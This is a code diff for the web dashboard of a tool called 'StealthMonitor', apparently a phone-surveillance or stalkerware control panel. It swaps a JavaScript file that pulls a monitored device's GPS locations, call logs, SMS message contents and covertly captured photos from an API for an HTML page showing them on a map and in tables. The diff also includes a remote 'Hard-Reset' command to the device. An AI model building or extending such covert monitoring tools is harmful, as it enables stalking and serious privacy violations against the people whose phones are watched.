@@ -1,76 +1,92 @@
-const API = window.location.origin + '/api';
-const token = localStorage.getItem('token');
-if (!token) location.href = 'index.html';
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8" />
+  <title>StealthMonitor – Dashboard</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
 
-const logoutBtn    = document.getElementById('logout');
-const refreshBtn   = document.getElementById('refresh');
-const hardResetBtn = document.getElementById('hardReset');
+  <!-- Seu CSS -->
+  <link rel="stylesheet" href="css/style.css" />
 
-logoutBtn.onclick = () => {
-  localStorage.removeItem('token');
-  location.href = 'index.html';
-};
-refreshBtn.onclick = loadData;
-hardResetBtn.onclick = async () => {
-  const user = JSON.parse(atob(token.split('.')[1])).username;
-  await fetch(`${API}/command/${user}`, {
-    method: 'POST',
-    headers: { Authorization: 'Bearer ' + token }
-  });
-  alert('Hard-Reset enviado');
-};
+  <!-- Leaflet CSS via CDN -->
+  <link
+    rel="stylesheet"
+    href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+    integrity="sha256-sA+e2Xb2l+0PRXMvl3eTwe/iyQ7ONkz6b3qTmZqE0EY="
+    crossorigin=""
+  />
 
-let map, markers = [];
-document.addEventListener('DOMContentLoaded', () => {
-  map = L.map('map').setView([0, 0], 2);
-  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-    attribution: '© OpenStreetMap'
-  }).addTo(map);
-  loadData();
-});
-
-async function loadData() {
-  markers.forEach(m=>map.removeLayer(m));
-  markers = [];
-  document.querySelector('#callsTable tbody').innerHTML = '';
-  document.querySelector('#smsTable tbody').innerHTML   = '';
-  document.getElementById('photos').innerHTML           = '';
-
-  const res = await fetch(`${API}/data`, {
-    headers: { Authorization: 'Bearer ' + token }
-  });
-  const pts = await res.json();
-  if (!pts.length) return alert('Nenhum dado disponível.');
-
-  pts.forEach(entry => {
-    const { lat, lng, date } = entry.location;
-    const marker = L.marker([lat, lng]).addTo(map)
-      .bindPopup(`Lat: ${lat.toFixed(5)}, Lng: ${lng.toFixed(5)}<br>${new Date(date).toLocaleString()}`);
-    markers.push(marker);
-
-    entry.calls.forEach(c => {
-      const tr = `<tr>
-        <td>${c.number}</td><td>${c.type}</td>
-        <td>${c.duration}</td><td>${new Date(c.date).toLocaleString()}</td>
-      </tr>`;
-      document.querySelector('#callsTable tbody').innerHTML += tr;
-    });
-
-    entry.sms.forEach(s => {
-      const tr = `<tr>
-        <td>${s.from}</td><td>${s.body}</td>
-        <td>${new Date(s.date).toLocaleString()}</td>
-      </tr>`;
-      document.querySelector('#smsTable tbody').innerHTML += tr;
-    });
-
-    if (entry.photo) {
-      const img = document.createElement('img');
-      img.src = 'data:image/jpeg;base64,' + entry.photo;
-      document.getElementById('photos').appendChild(img);
+  <style>
+    body, html { margin:0; padding:0; font-family:sans-serif; }
+    header {
+      padding:1rem; background:#333; color:#fff;
+      display:flex; justify-content:space-between; align-items:center;
     }
-  });
+    #map { height:300px; }
+    section { padding:1rem; }
+    table {
+      width:100%; border-collapse:collapse; margin-top:.5rem;
+    }
+    th, td {
+      border:1px solid #ccc; padding:.5rem; text-align:left;
+    }
+    th { background:#f0f0f0; }
+    #photos img {
+      max-width:100px; margin:.5rem; border:1px solid #ddd;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div>
+      <button id="logout">Logout</button>
+      <button id="hardReset">Hard-Reset</button>
+    </div>
+    <button id="refresh">🔄 Atualizar</button>
+  </header>
 
-  const first = pts[0].location;
-  map.setView([first.lat, first.lng], 13);
-}
+  <section>
+    <h2>Localização</h2>
+    <div id="map"></div>
+  </section>
+
+  <section>
+    <h2>Chamadas</h2>
+    <table id="callsTable">
+      <thead>
+        <tr>
+          <th>Número</th><th>Tipo</th><th>Duração(s)</th><th>Hora</th>
+        </tr>
+      </thead>
+      <tbody></tbody>
+    </table>
+  </section>
+
+  <section>
+    <h2>SMS</h2>
+    <table id="smsTable">
+      <thead>
+        <tr>
+          <th>De</th><th>Conteúdo</th><th>Hora</th>
+        </tr>
+      </thead>
+      <tbody></tbody>
+    </table>
+  </section>
+
+  <section>
+    <h2>Fotos Capturadas</h2>
+    <div id="photos"></div>
+  </section>
+
+  <!-- Leaflet JS via CDN -->
+  <script
+    src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
+    integrity="sha256-o9N1j7bP+5+FfiYPMU+ag6Gpv7vGj8IJzLeC78x0zUo="
+    crossorigin="">
+  </script>
+
+  <!-- Seu script de dashboard -->
+  <script src="js/dashboard.js"></script>
+</body>
+</html>
